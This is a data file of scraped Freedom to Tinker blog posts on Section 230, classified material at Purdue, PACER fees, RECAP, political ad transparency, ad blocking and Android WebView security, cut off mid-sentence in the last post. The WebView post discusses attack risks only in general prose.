"17","2022-12-19","2023-03-24","https://freedom-to-tinker.com/2022/12/19/citp-tech-clinic-files-amicus-brief-in-gonzalez-v-google-case/","By Nia Brazzell and Mihir Kshirsagar In Gonzalez v. Google, a case under review at the Supreme Court, the families of individuals killed by ISIS terrorist attacks in Paris allege that YouTube aided and abetted terrorist strikes by radicalizing recruits through personalized recommendations of videos. CITP’s Tech Policy Clinic filed its first amicus brief before the Supreme Court to help it analyze how the interpretation of Section 230 of the Communications Decency Act would affect platform accountability.* As many readers of this blog know, that provision has increasingly been a topic of discussion as voices on all sides call for amendment, repeal, or greater direction from the courts. At issue in Gonzalez is the appropriate interpretation of Section 230§(c)(1), which states that “no provider or user of an interactive computer service shall be treated as the publisher or speaker of any information provided by another information content provider.” Congress was motivated to pass the law, in part, because of a state court decision in the Stratton Oakmont case, in which a broker sued Prodigy for defamation based on anonymous third-party posts on a Prodigy bulletin board that accused that broker of engaging in criminal conduct. (The Wolf of Wall Street movie is based on the broker’s actions.) The court found that Prodigy could be liable because it acted more like a publisher of those posts rather than a passive distributor like a bookstore. It reasoned that Prodigy’s use of content moderation tools, like an automated screening program to detect offensive language, made it take on a more active role. Congress sought to clarify through Section 230 that platforms could continue to engage in content moderation without being exposed to liability for serving as a conduit for third-party content. The Supreme Court has not yet had a chance to weigh in on how to interpret the law. Many lower court decisions have interpreted Section 230 expansively. The Ninth Circuit dismissed the Gonzalez case on the grounds that Section 230 immunized Google for its content recommendations. It explained, “[t]his system is certainly more sophisticated than a traditional search engine, which requires users to type in textual queries, but the core principle is the same: Google’s algorithms select the particular content provided to a user based on that user’s inputs.” As a result, the court reasoned that YouTube had used “neutral” algorithmic tools protected by Section 230 , and should not have to face any allegations that its algorithms may have contributed to illegal conduct. Our brief takes a neutral perspective. We focus on a technical explanation of how the underlying recommendation systems work and why different interpretations of the law might affect platform accountability. Specifically, we explain how platforms have a much greater role in shaping a user’s internet experience in 2022 than they did in 1996. If you take a spin through Instagram, TikTok, YouTube, or Spotify, you see dynamically generated and heavily personalized content. The platform’s ability to prioritize or de-prioritize what users interact with gives them significant power to shape experiences. While our brief did not take sides in the case, we emphasized that if the Court took the expansive content-neutral approach adopted by the Ninth Circuit, it could immunize a wide range of conduct by platforms that has significant implications for society. For example, a platform could be immunized for its role in the discriminatory distribution of content, or for improperly demoting third-party content. Briefing in the case will be completed by January and the oral argument is scheduled for February 21, 2023. * Nia Brazzell, Klaudia Jaźwińska, and Varun Rao contributed to the Clinic’s amicus brief."
"18","2015-10-08","2023-03-24","https://freedom-to-tinker.com/2015/10/08/classified-material-in-the-public-domain-whats-a-university-to-do/","Yesterday I posted some thoughts about Purdue University’s decision to destroy a video recording of my keynote address at its Dawn or Doom colloquium. The organizers had gone dark, and a promised public link was not forthcoming. After a couple of weeks of hoping to resolve the matter quietly, I did some digging and decided to write up what I learned. I posted on the web site of the Century Foundation, my main professional home: It turns out that Purdue has wiped all copies of my video and slides from university servers, on grounds that I displayed classified documents briefly on screen. A breach report was filed with the university’s Research Information Assurance Officer, also known as the Site Security Officer, under the terms of Defense Department Operating Manual 5220.22-M. I am told that Purdue briefly considered, among other things, whether to destroy the projector I borrowed, lest contaminants remain. I was, perhaps, naive, but pretty much all of that came as a real surprise. Let’s rewind. Information Assurance? Site Security? These are familiar terms elsewhere, but new to me in a university context. I learned that Purdue, like a number of its peers, has a “facility security clearance” to perform classified U.S. government research. The manual of regulations runs to 141 pages. (Its terms forbid uncleared trustees to ask about the work underway on their campus, but that’s a subject for another day.) The pertinent provision here, spelled out at length in a manual called Classified Information Spillage, requires “sanitization, physical removal, or destruction” of classified information discovered on unauthorized media. Two things happened in rapid sequence around the time I told Purdue about my post. First, the university broke a week-long silence and expressed a measure of regret: UPDATE: Just after posting this item I received an email from Julie Rosa, who heads strategic communications for Purdue. She confirmed that Purdue wiped my video after consulting the Defense Security Service, but the university now believes it went too far. “In an overreaction while attempting to comply with regulations, the video was ordered to be deleted instead of just blocking the piece of information in question. Just FYI: The conference organizers were not even aware that any of this had happened until well after the video was already gone.” “I’m told we are attempting to recover the video, but I have not heard yet whether that is going to be possible. When I find out, I will let you know and we will, of course, provide a copy to you.” Then Edward Snowden tweeted the link, and the Century Foundation’s web site melted down. It now redirects to Medium, where you can find the full story. I have not heard back from Purdue today about recovery of the video. It is not clear to me how recovery is even possible, if Purdue followed Pentagon guidelines for secure destruction. Moreover, although the university seems to suggest it could have posted most of the video, it does not promise to do so now. Most importantly, the best that I can hope for here is that my remarks and slides will be made available in redacted form — with classified images removed, and some of my central points therefore missing. There would be one version of the talk for the few hundred people who were in the room on Sept. 24, and for however many watched the live stream, and another version left as the only record. For our purposes here, the most notable questions have to do with academic freedom in the context of national security. How did a university come to “sanitize” a public lecture it had solicited, on the subject of NSA surveillance, from an author known to possess the Snowden documents? How could it profess to be shocked to find that spillage is going on at such a talk? The beginning of an answer came, I now see, in the question and answer period after my Purdue remarks. A post-doctoral research engineer stood up to ask whether the documents I had put on display were unclassified. “No,” I replied. “They’re classified still.” Eugene Spafford, a professor of computer science there, later attributed that concern to “junior security rangers” on the faculty and staff. But the display of Top Secret material, he said, “once noted, … is something that cannot be unnoted.” Someone reported my answer to Purdue’s Research Information Assurance Officer, who reported in turn to Purdue’s representative at the Defense Security Service. By the terms of its Pentagon agreement, Purdue decided it was now obliged to wipe the video of my talk in its entirety. I regard this as a rather devout reading of the rules, which allowed Purdue to “realistically consider the potential harm that may result from compromise of spilled information.” The slides I showed had been viewed already by millions of people online. Even so, federal funding might be at stake for Purdue, and the notoriously vague terms of the Espionage Act hung over the decision. For most lawyers, “abundance of caution” would be the default choice. Certainly that kind of thinking is commonplace, and sometimes appropriate, in military and intelligence services. But universities are not secret agencies. They cannot lightly wear the shackles of a National Industrial Security Program, as Purdue agreed to do. The values at their core, in principle and often in practice, are open inquiry and expression. I do not claim I suffered any great harm when Purdue purged my remarks from its conference proceedings. I do not lack for publishers or public forums. But the next person whose talk is disappeared may have fewer resources. More importantly, to my mind, Purdue has compromised its own independence and that of its students and faculty. It set an unhappy precedent, even if the people responsible thought they were merely following routine procedures. One can criticize the university for its choices, and quite a few have since I published my post. What interests me is how nearly the results were foreordained once Purdue made itself eligible for Top Secret work. Think of it as a classic case of mission creep. Purdue invited the secret-keepers of the Defense Security Service into one cloistered corner of campus (“a small but significant fraction” of research in certain fields, as the university counsel put it). The trustees accepted what may have seemed a limited burden, confined to the precincts of classified research. Now the security apparatus claims jurisdiction over the campus (“facility”) at large. The university finds itself “sanitizing” a conference that has nothing to do with any government contract. I am glad to see that Princeton takes the view that “[s]ecurity regulations and classification of information are at variance with the basic objectives of a University.” It does not permit faculty members to do classified work on campus, which avoids Purdue’s “facility” problem. And even so, at Princeton and elsewhere, there may be an undercurrent of self-censorship and informal restraint against the use of documents derived from unauthorized leaks. Two of my best students nearly dropped a course I taught a few years back, called “Secrecy, Accountability and the National Security State,” when they learned the syllabus would include documents from Wikileaks. Both had security clearances, for summer jobs, and feared losing them. I told them I would put the documents on Blackboard, so they need not visit the Wikileaks site itself, but the readings were mandatory. Both, to their credit, stayed in the course. They did so against the advice of some of their mentors, including faculty members. The advice was purely practical. The U.S. government will not give a clear answer when asked whether this sort of exposure to published secrets will harm job prospects or future security clearances. Why take the risk? Every student and scholar must decide for him- or herself, but I think universities should push back harder, and perhaps in concert. There is a treasure trove of primary documents in the archives made available by Snowden and Chelsea Manning. The government may wish otherwise, but that information is irretrievably in the public domain. Should a faculty member ignore the Snowden documents when designing a course on network security architecture? Should a student write a dissertation on modern U.S.-Saudi relations without consulting the numerous diplomatic cables on Wikileaks? To me, those would be abdications of the basic duty to seek out authoritative sources of knowledge, wherever they reside. I would be interested to learn how others have grappled with these questions. I expect to write about them in my forthcoming book on surveillance, privacy and secrecy."
"19","2018-04-01","2023-03-24","https://freedom-to-tinker.com/2018/04/01/judge-declares-some-pacer-fees-illegal-but-does-not-go-far-enough/","Five years ago, in a post called “Making Excuses for Fees on Electronic Public Records,” I described my attempts to persuade the federal Judiciary to stop charging for access to their web-based system, PACER (“Public Access to Court Electronic Records”). Nearly every search, page view, and PDF download from the system incurs a fee ranging from 10 cents to $3 (or, in some cases, much more). I chronicled the many excuses that the courts have provided for charging what amounts to $150 million in fees every year for something that should—by all reasonable accounts—not cost much to provide. I thought the courts were violating the law. I suggested that someone file suit. Two years later, the good folks at Gupta/Wessler did (in partnership with Motley Rice). Yesterday, Judge Huvelle of the US District Court for the District of Columbia agreed—in part. You can read her opinion here, and see all documents in the case here. Under her ruling, approximately $200 million will likely be returned to people who paid PACER fees from 2010 to 2016. This is good, but not good enough. It also does not address the larger constitutional issues that I raise in my forthcoming paper, “The Price of Ignorance: The Constitutional Cost of Fees for Access to Electronic Public Court Records.” Judge Huvelle is a good and fair judge. She rejected the reasoning of both the plaintiffs and the defendants (the Judiciary). Instead, she substituted her own analysis. Unfortunately, her analysis was both legally and technically flawed. Under her ruling, PACER fee-payers will not recover another $750 million (or so) of fees that I think are unlawful. The rest of this post explains why, and what might be next. The law says that the Judiciary “may, only to the extent necessary, prescribe reasonable fees… to reimburse expenses incurred in providing these services.” The lawsuit centered on the meaning of terms like “only to the extent necessary” and “these services.” During the litigation, the Judiciary provided a spreadsheet showing how PACER fees were spent across different categories (categories invented by the Judiciary). About a quarter of these fees were spent on things that related to public access tangentially at best (for example, “courtroom technologies”). The judge decided that these were illegal. About 15% of fees were under a different heading: “Public Access Services.” The plaintiffs did not allege that these were illegal even though ~$25m per year seems an awful lot for serving digital documents to the public. Only the middle set of categories—about $100m per year—was seriously in dispute. Pages 18 to 20 show the breakdown for 2016, which fall into the following categories (items in bold were seriously in dispute). 2016 Example: “Program Requirements” (all deemed legal by Judge Huvelle) Public Access Services (~$24m) Case Management/Electronic Case Files System (CM/ECF) (~$40m) Communications Infrastructure, Services, and Security (~$46m) Court Allotments (~$7m) Electronic Bankruptcy Noticing (~$7m) “Congressional Priorities” (all deemed illegal by Judge Huvelle) Victim Notification (~$100k) Web-based Juror Services (~$2m) Courtroom Technology (~$25m) The practical question in the case was whether the line between legal and illegal uses of PACER funds fell above, below, or somewhere in-between the items in bold. At oral argument, plaintiffs’ counsel was clearly surprised that the judge seemed ready to rule on the merits of that question at this phase of the litigation. The parties had stipulated to limited discovery during this phase, so there is little in the record about what those categories mean. Aesthetically, it would be clean to make the split between the two major headings. Judge Huvelle did not base her reasoning on spreadsheet headings, but her ruling was consistent with them. Everything under “Program Requirements” was allowed. On Twitter, I’ve seen people describe this decision as “splitting the baby.” If this means that the decision chooses a somewhat arbitrary point between two parties’ positions, that is true. Of course, the origin of the phrase is King Solomon’s wise adjudication of a child custody dispute. When he threatened to literally cut a baby in two, the true mother revealed herself and justice was served. To actually split the baby does not serve justice. CM/ECF is the system for attorneys to file documents electronically and for the courts to manage almost all case materials that they used to manage on paper. CM/ECF is an essential tool for operations of the courts, and has generated tremendous cost savings for the Judiciary. Attorneys do not pay for CM/ECF, and the Judiciary has never asked for appropriations to fund it. Instead, it has been funded entirely by PACER fees. In the words of Judge Huvelle, this is justified because “PACER cannot be divorced from CM/ECF.” True, PACER users would not have much to access without electronic filings. But CM/ECF, on the other hand, can be divorced from PACER. The judge has simply analyzed the “but for” causation in reverse. CM/ECF is as essential to the functioning of the modern courts as the physical clerk’s office. Regardless of whether PACER exists, CM/ECF must exist. (And if PACER is “merely the portal to the millions of electronically-filed documents that are housed by the judiciary on CM/ECF” then why does it cost $24m per year to operate?) Judge Huvelle sidesteps this issue when she dismisses the notion that the appropriate yardstick of permissible PACER fees is “the marginal cost” of operating PACER. This language comes from the congressional report on the E-Government Act, which created some of the statutory language in question. “Marginal cost” refers to the economic principle that the true cost of providing a good or service is only the additional cost above and beyond what would otherwise be spent. Tim Lee explained, in his 2009 post “The Trouble with PACER Fees” here, why even a principled libertarian should be in favor of taxing the general public for the bold items above. It’s not just economics. It’s about maintaining a liberty-enhancing justice system that is transparent and knowable by those that it governs. Another principle of our democracy is that only Congress may impose taxes, because it is the branch most accountable to the people. If it were otherwise, the Executive and the Judiciary could impose taxes with impunity. When Congress delegates its taxing power, it must do so clearly and unequivocally. That is the lesson of the unanimous Supreme Court case Skinner v. Mid-America Pipeline Company. Judge Huvelle brushes away this line of argument in her opinion by claiming that the statute unambiguously supports her line-drawing. It bears repeating that I think that Judge Huvelle is a good and fair judge. Her opinion is the best summary of legislative and judicial history in this area. It is solid within its four corners. However, it is wrong. One need only begin to pull on the dangling threads in the unexplored sub-line-items to see that something is deeply wrong. Two examples from CM/ECF illustrate the point. First, in 2016, the Judiciary appears to have spent a couple million dollars per year on running conferences for judicial staff to learn how to use CM/ECF (“CSO Combined Forum”). This line-item is described in slightly more detail on page 84 of a document dump from the Judiciary, filed a week before the March 23 hearing. (And that same document contains budget spreadsheets from before 2010, which characterize the bold items as “Congressional Priorities” rather than “Program Requirements”.) The second example has a more dramatic effect on overall costs. The CM/ECF headings for 2010 to 2016 have sub-line-items for “NextGen,” the complete overhaul of CM/ECF that began in 2009 and continues to this date. Annual totals frequently top $10m. However, PACER users in district courts that have implemented NextGen (such as Connecticut), will notice essentially no change in functionality in exchange for their years of user fees. Judge Huvelle construes the plaintiffs as having forfeited any argument about NextGen costs because she thinks that the attorneys “rais[ed] no challenge to CM/ECF if the statute authorizes ‘PACER fees to cover all costs necessary for providing PACER access and other public access services.'” After the March 23 hearing in which it became clear that she was about to rule on CM/ECF without further discovery, the plaintiffs’ attorneys submitted a supplemental filing (at p. 3) indicating that even their preliminary review of NextGen raised serious questions about whether it was indeed necessary for PACER. Other line items—such as the ~$10m/year Electronic Bankruptcy Noticing (EBN) system, which notifies creditors when someone files for bankruptcy—are permitted and will apparently undergo no further scrutiny. I don’t know what is next for this litigation. It is good that PACER users will likely see some refund of illegally charged fees. But the systemic problems created by PACER fees will likely persist unless something else forces action."
"20","2014-05-19","2023-03-24","https://freedom-to-tinker.com/2014/05/19/free-law-project-partnering-in-stewardship-of-recap/","More than five years ago, I spoke at CITP about the US Federal Courts electronic access system called PACER. I noted that despite centuries of precedent stating that the public should have access to the law as openly and freely as possible, the courts were charging unreasonable rates for access to the public record. As it happened, David Robinson, Harlan Yu, Bill Zeller, and Ed Felten had recently written their paper “Government Data and the Invisible Hand“, arguing that: …the executive branch should focus on creating a simple, reliable and publicly accessible infrastructure that exposes the underlying data. Private actors, either nonprofit or commercial, are better suited to deliver government information to citizens and can constantly create and reshape the tools individuals use to find and leverage public data. After my talk, Harlan Yu and Tim Lee approached me with an idea to make millions of court records available for free: a simple browser extension that made it easy for individuals to share the records that they had purchased from PACER with others who were looking for the same records. The idea became RECAP (“turning PACER around”), and the tool has indeed helped to liberate millions of public records in the years since then. But the time has come to turn over our stewardship, and we could not be more pleased that CITP is announcing a new partnership with Free Law Project to take over and expand upon RECAP. RECAP has been a success for years now, but Tim, Harlan, and I have each taken on more projects and responsibilities. We will continue to assist with the technical maintenance of RECAP and will advocate alongside Free Law Project for the long-term win of opening PACER altogether (you may not have noticed it, but lawmakers are starting to pay attention). Free Law Project is also home to the CourtListener platform, which houses another tremendous cache of public court records. RECAP and CourtListener records will be integrated with each other, leading to what we think is the largest body of US caselaw that is available for free online. In an era in which the price of digital storage and transmission is low enough for a few dedicated developers to host such an archive on a shoestring budget, the Judiciary should simply open up all public court records to the public so that every citizen can know the law. Two recent letters to the editor of the ABA Journal highlight the persistent urgency of this issue: Regarding “Keeping PACER,” March: PacerPro is having you pay to add to its private collection of government works and can turn off your free access to it at any time it chooses—all in exchange for a few minor features, mostly a prettier interface. But rather than contribute these documents to a company that can lock them up and exploit them, you should use PACER in combination with the RECAP Web browser add-on, which puts these documents in a public archive available to everyone. Pamela Chestek Raleigh, N.C. PACER is evocative of our broken criminal justice system: willfully deficient, where justice is only available to those who can afford it. The real obstacle to change is the fear of government officials, who have become accustomed to the lack of transparency that has become the platform for their corrupt practices. Because fixing PACER is only the first step. What crimes does the government often charge, only to later drop? How many people like Aaron Swartz are there, bullied and threatened with inflated accusations? How often is a particular person a witness in a case, e.g., a known corrupt cop or expert witness? Those are questions only machine-readable bulk data, accessible to everyone for free, can answer. It is high time the chief justice of the United States—as the presiding officer of the Judicial Conference of the United States, the supervisory body with authority over both the Administrative Office of the United States Courts and PACER—takes action. And if he won’t do his job, then Congress should. Eric Branson Denver"
"21","2022-07-14","2023-03-24","https://freedom-to-tinker.com/2022/07/14/new-study-analyzing-political-advertising-on-facebook-google-and-tiktok%ef%bf%bc/","By Orestis Papakyriakopoulos, Christelle Tessono, Arvind Narayanan, Mihir Kshirsagar With the 2022 midterm elections in the United States fast approaching, political campaigns are poised to spend heavily to influence prospective voters through digital advertising. Online platforms such as Facebook, Google, and TikTok will play an important role in distributing that content. But our new study – How Algorithms Shape the Distribution of Political Advertising: Case Studies of Facebook, Google, and TikTok — that will appear in the Artificial Intelligence, Ethics, and Society conference in August, shows that the platforms’ tools for voluntary disclosures about political ads do not provide the necessary transparency the public needs. More details can also be found on our website: campaigndisclosures.princeton.edu. Our paper conducts the first large-scale analysis of public data from the 2020 presidential election cycle to critically evaluate how online platforms affect the distribution of political advertisements. We analyzed a dataset containing over 800,000 ads about the 2020 U.S. presidential election that ran in the 2 months prior to the election, which we obtained from the ad libraries of Facebook and Google that were created by the companies to offer more transparency about political ads. We also collected and analyzed 2.5 million TikTok videos from the same time period. These ad libraries were created by the platforms in an attempt to stave off potential regulation such as the Honest Ads Act, which sought to impose greater transparency requirements for platforms carrying political ads. But our study shows that these ad libraries fall woefully short of their own objectives to be more transparent about who pays for the ads and who sees the ads, as well the objectives of bringing greater transparency about the role of online platforms in shaping the distribution of political advertising. We developed a three-part evaluative framework to assess the platform disclosures: 1. Do the disclosures meet the platforms’ self-described objective of making political advertisers accountable? 2. How do the platforms’ disclosures compare against what the law requires for radio and television broadcasters? 3. Do the platforms disclose all that they know about the ad targeting criteria, the audience for the ads, and how their algorithms distribute or moderate content? Our analysis shows that the ad libraries do not meet any of the objectives. First, the ad libraries only have partial disclosures of audience characteristics and targeting parameters of placed political ads. But these disclosures do not allow us to understand how political advertisers reached prospective voters. For example, we compared ads in the ad libraries that were shown to different audiences with dummy ads that we created on the platforms (Figure 1). In many cases, we measured a significant difference between the calculated cost-per-impression between the two types of ads, which we could not explain with the available data. Figure 1. We plot the generated cost per impression of ads in the ad-libraries that were (1) targeted to all genders & ages on Google, (2) to Females, between 25-34 on YouTube, (3) were seen by all genders & ages in the US on Facebook, and (4) only by females of all ages located in California on Facebook. For Facebook, lower & upper bounds are provided for the impressions. For Google, lower & upper bounds are provided for cost & impressions, given the extensive “bucketing” of the parameters performed by the ad libraries when reporting them, which are denoted in the figures with boxes. Points represent the median value of the boxes. We compare the generated cost-per impression of ads with the cost-per impression of a set of dummy ads we placed on the platforms with the exact same targeting parameters & audience characteristics. Black lines represent the upper and lower boundaries of an ad’s cost-per-impression as we extracted them from the dummy ads. We label an ad placement as “plausible targeting”, when the ad cost-per-impression overlaps with the one we calculated, denoting that we can assume that the ad library provides all relevant targeting parameters/audience characteristics about an ad. Similarly, an placement labeled as `”unexplainable targeting’” represents an ad whose cost-per-impression is outside the upper and lower reach values that we calculated, meaning that potentially platforms do not disclose full information about the distribution of the ad. Second, broadcasters are required to offer advertising space at the same price to political advertisers as they do to commercial advertisers. But we find that the platforms charged campaigns different prices for distributing ads. For example, on average, the Trump campaign on Facebook paid more per impression (~18 impressions/dollar) compared to the Biden campaign (~27 impressions/dollar). On Google, the Biden campaign paid more per impression compared to the Trump campaign. Unfortunately, while we attempted to control for factors that might account for different prices for different audiences, the data does not allow us to probe the precise reason for the differential pricing. Third, the platforms do not disclose the detailed information about the audience characteristics that they make available to advertisers. They also do not explain how the algorithms distribute or moderate the ads. For example, we see that campaigns placed ads on Facebook that were not ostensibly targeted by age, but the ad was not distributed uniformly. We also find that platforms applied their ad moderation policies inconsistently, with some instances of moderated ads being removed and some others not, and without any explanation for the decision to remove an ad. (Figure 2) Figure 2. Comparison of different instances of moderated ads across platforms. The light blue bars show how many instances of a single ad were moderated, and maroon bars show how many instances of the same ad were not. Results suggests an inconsistent moderation of content across platforms, with some instances of the same ad being removed and some others not. Finally, we observed new forms of political advertising that are not captured in the ad libraries. Specifically, campaigns appear to have used influencers to promote their messages without adequate disclosure. For example, on TikTok, we document how political influencers, who were often linked with PACs, generated billions of impressions from their political content. This new type of campaigning still remains unregulated and little is known about the practices and relations between influencers and political campaigns. In short, the online platform self-regulatory disclosures are inadequate and we need more comprehensive disclosures from platforms to understand their role in the political process. Our key recommendations include: – Requiring that each political entity registered with the FEC use a single, universal identifier for campaign spending across platforms to allow the public to track their activity. – Developing a cross-platform data repository, hosted and maintained by a government or independent entity, that collects political ads, their targeting criteria, and the audience characteristics that received them. – Requiring platforms to disclose information that will allow the public to understand how the algorithms distribute content and how platforms price the distribution of political ads. – Developing a comprehensive definition of political advertising that includes influencers and other forms of paid promotional activity."
"22","2014-12-11","2023-03-24","https://freedom-to-tinker.com/2014/12/11/striking-a-balance-between-advertising-and-ad-blocking/","In the news, we have a consortium of French publishers, which somehow includes several major U.S. corporations (Google, Microsoft), attempting to sue AdBlock Plus developer Eyeo, a German firm with developers around the world. I have no idea of the legal basis for their case, but it’s all about the money. AdBlock Plus and the closely related AdBlock are among the most popular Chrome extensions, by far, and publishers will no doubt claim huge monetary damages around presumed “lost income”. First off, it’s important to understand just how invasive and unpleasant the advertising industry has become. I put together a one hour talk about this, in late 2012, for a conference that was hosted by the Federal Trade Commission. In short, advertisers go out of their way to profile you and learn as much about you as possible. In some cases there’s an auction that occurs in the space of milliseconds to maximize the value of the advertising being shown to you. There’s a huge ecosystem of companies that sell services to the advertising marketplace, both on the web and on mobile. Those ads you see inside your apps? They’re just web pages, using all of the same mechanisms, but with additional bonus privacy concerns, such as capturing your GPS location or reading unique hardware identifiers from your phone. Ad blocking technology benefits: Ad blockers, on mobile and on the web, are a simple mechanism that pushes back on this invasive behavior. Android ad blocks forbid your phone from connecting to specific DNS names, although Android users can add on the remarkably detailed XPrivacy extension or can install a third-party variant of Android called CyanogenMod which includes the user-friendly PrivacyGuard feature (read more on those in a nice article on XDA Developers). Web browser ad blockers are quite sophisticated. Even when advertisers use crazy obfuscated JavaScript to hide themselves, the blockers just wait for the ads to show up somewhere on the page and then remove them when they appear. Ad blockers have all sorts of benefits to their users. Turns out that advertising uses a significant fraction of the power budget of your mobile phone. Remove the ads and you get longer battery life (gory details, see: Vallina-Rodriguez et al. 2012, Pathak et al. 2012). But wait, there’s more! A significant number of Android apps request networking privileges solely for the purpose of fetching advertising and it’s getting worse over time (see my own work on this: Shekhar et al. 2012, Book et al. 2013). The more security privileges an Android app has, the more that minor bugs can be abused to become significant security vulnerabilities. If an app doesn’t otherwise need full network access, why should it have that privilege at all? Privacy and ad blocking technologies consequently improve a user’s security posture, save power, and improve page loading times. What’s not to like about that? But, but, but… ad revenues: Yes, advertising pays the bills. Way back when, there was a time that we thought micropayments would solve the problem, but instead of micropayments flowing from users to publishers through some clever cryptographic mechanisms, we instead have those payments flowing from advertising services to publishers, through pedestrian accounting mechanisms. If users block ads, then publishers can claim “lost revenues”, right? Astute readers will notice that this sounds much like the claim that software piracy leads to lost revenues, and will recognize just how bogus this claim is. For example, if we could reduce piracy on Adobe Creative Suite to zero, would all those graphical design tool users buck up and pay Adobe thousands of dollars? Dream on. They’d instead become aficionados of much cheaper tools, such as the remarkably good Pixelmator. Similarly, people who block advertising are precisely the sorts of people who are least likely to click on ads. If you force them to see ads, they’ll hate you and won’t click anyway. Advertising revenues are largely based on clicks. No clicks, no revenue. So how, then, can we solve the problem? The dream world: Right now, web and mobile advertising build on a slew of mechanisms that were never expressly intended for them, and they operate largely without any regulation as to what’s okay and what’s verboten. My proposal is simple. If you want to require me to see your ads, then you need to be regulated as to what information you’re allowed to collect about me, what you’re allowed to do with that information, how much of my power budget you’re allowed to consume, and how visually intrusive you’re allowed to be. For example, in our own work (Shekhar et al. 2012), we considered how Android might offer advertising as a top-level system service that could ration power and avoid privilege bloat from advertising libraries. In short, we have the technology to regulate advertising and make it operate in a more secure, more power efficient, and more privacy-aware fashion, but that technology needs to be built into the platform if it’s going to have any measure of success. If we’re going to resign ourselves to a world of advertising-supported content, then we need to meet in the middle. User-level technologies like ad blockers or nation-state regulatory authorities can curb the current excesses of the advertising industry, and purpose-built alternatives can provide necessary revenues."
"23","2015-01-28","2023-03-24","https://freedom-to-tinker.com/2015/01/28/android-webview-security-and-the-mobile-advertising-marketplace/","Freedom to Tinker readers are probably aware of the current controversy over Google’s handling of ongoing security vulnerabilities in its Android WebView component. What sounds at first like a routine security problem turns out to have some deep challenges. Let’s start by filling in some background and build up to the big problem they’re not talking about: Android advertising. What is a WebView? WebView is just a widget that any Android app can use as part of its on-screen layout. A WebView is really a full-blown web browser with all of the features you’d expect: JavaScript (disabled by default but available), images, etc. This sort of component is particularly attractive to developers who are trying to build apps that work on multiple platforms (Apple iOS, Google Android, etc.). There’s a popular developer’s library, PhoneGap, that’s all about taking advantage of this. Up to Android 4.3, WebView was a component baked into the Android distribution. When an Android app wants to use a WebView inside the app, it gets the WebView provided by the platform, which is based on the WebKit browser framework, much like Chrome, Safari, and many other browsers out there. How do Android security vulnerabilities get patched? Like any complex software platform, Android has its share of security bugs. Generally speaking, Google would fix the bugs and ship a new release of Android. Phone vendors then pick up these new releases, add back in their proprietary features (e.g., Samsung’s TouchWiz or HTC’s SenseUI), and pass on the release… to whom? Typically, phone vendors are blocked by the carriers (AT&T, Verizon, etc.) from directly shipping patches to the phone. Instead, the carriers typically have to approve the changes. Apple famously forced the carriers to get out of the way and will push changes directly to its users. The net result of this was that Apple could push security patches out quickly, while Google couldn’t. Google responded with a major refactoring of Android, moving many components out of the core distribution and into a new component called Google Play Services, which they could update frequently, allowing older Android phones access to newer features. (You can find additional background in a nice 2013 article from Ars Technica. This change also meant that large chunks of Android ceased being open source. That controversy is beyond the scope of this discussion.) WebViews, which we remind you are really full-blown web browsers, were still baked into the core Android distribution until Android 4.4, when they too were broken out for more rapid updates. That’s good for Android 4.4 and newer phones, but it means that older Android platforms are using older versions of WebView. Why is that a problem? The security of a modern web browser, and this includes WebView, is based on rapidly getting updates into the field, because there’s always yet another bug with yet another subtle but serious security consequence. Because WebView is built on WebKit, a popular open source browser, vulnerabilities in its older versions are well known and exploits are easy to come by. Google can push security fixes quickly for this to Android 4.4 and newer, but what about all those users stuck on Android 4.3? How are they supposed to get updates to the WebView component? How bad is it if they’re running an old WebView? According to a January 23 posting by Google engineer Adrian Ludwig: WebKit alone is over 5 million lines of code and hundreds of developers are adding thousands of new commits every month, so in some instances applying vulnerability patches to a 2+ year old branch of WebKit required changes to significant portions of the code and was no longer practical to do safely. With the advances in Android 4.4, the number of users that are potentially affected by legacy WebKit security issues is shrinking every day as more and more people upgrade or get new devices. AppBrain reports that, as of January 26, Android 4.4 has 36.6% of the Android market share and Android 5.0 has 0.7% market share. Android 4.1 through 4.3 combined have roughly half of the Android market, declining by 4% per month. Clearly, the sort of vulnerabilities we’re discussing impact a large fraction of the installed Android user base and will continue to do so for the next year or two, but perhaps not as much beyond that. Even if Google were to produce a patched version of Android 4.3, as discussed above, it would require a laborious process to get it out the door, through the phone vendors and carriers, before it could hit users’ devices. Demonstrably, those vendors have already abandoned those older phones. They could have ported newer Android versions to their existing phones, but they didn’t. Would they be any more likely to adopt security patches Google gives them for Android 4.3? It’s hard to say, but probably not. Instead, Ludwig give app developers this advice: developers should confirm that only trusted content (e.g. loaded from a local source or over HTTPS) is displayed within WebViews in their application. For maximum security when rendering content from the open web, consider providing your own renderer on Android 4.3 and earlier so that you can keep it up to date with the latest security patches. Detail from Luma Partners’ “Mobile LUMAscape” illustration. And that’s where things get interesting because of the largest and most pervasive use of WebViews: advertising. We’ve been studying the Android advertising universe for several years, and it’s worth making some basic observations: Virtually all the advertising you see in Android apps is hosted inside a WebView. It’s all just HTML, JavaScript, and images, and it’s all generally loaded over HTTP. That means there’s no encryption and no authentication, violating Google’s security advice. Just like web advertising, mobile advertising uses HTTP redirects, so the content can come from a variety of different sources. Attackers may well be able to craft malicious content and use any of the many advertising services to deliver it directly into apps. TLS is not used for most advertising, so, if an attacker is in a position to mount a DNS poisoning attack or the attacker controls the network you’re connected to, the attacker can deliver malicious content directly into your apps’ advertising window. In short, if you run an app on Android 4.3 that has advertising within it, you’re vulnerable to WebView attacks under realistic conditions. A WebView runs with the same privileges as the app that’s hosting it. If malicious advertising content can break the browser’s security and run “natively”, it will still be constrained by Android’s permission system. Unfortunately, such malware can exercise all of the app’s privileges. It’s ubiquitous for Android apps to have full Internet privileges, and many apps have a variety of more sensitive permissions (e.g., your GPS location). Maliciously crafted advertising content will then inherit all these privileges. Even with full Internet privileges and nothing else, malicious ad content connected to the WiFi behind your firewall could use your phone as a launching pad for further attacks. Since we’re talking about Android 4.3, which was released in 2013, we’re also talking about a Linux-derived OS kernel of similar vintage, giving the attacker a vast array of previously known vulnerabilities (or homebrew zero-day vulnerabilities) in both Android and Linux. This could allow an attacker who can break the browser to escalate to full privileges over the phone, with all the attendant attack options. It’s not pretty. Older versions of the WebView have even bigger security holes. For example, webviews on Android 4.1 and earlier allow the execution of arbitrary native code by reflection on apps that have a custom JavaScript interface installed. Google’s solution appears to be pushing this problem onto the shoulders of the huge Android developer community, but they’ve made no public statements about requiring these changes. There’s no clause threatening app authors to remove their apps from the store if they’re not compliant with Google’s new security guidelines. This is particularly a problem since most app authors probably aren’t using WebView themselves. They just include an advertising library, and may not even be aware that there’s a WebView being used within. How can users protect themselves? While it’s easy to advise users to uninstall all of their advertising-supported apps, this sort of advice seems unlikely to be taken widely. Users of many phones might look at upgrading their phones, on their own, to CyanogenMod 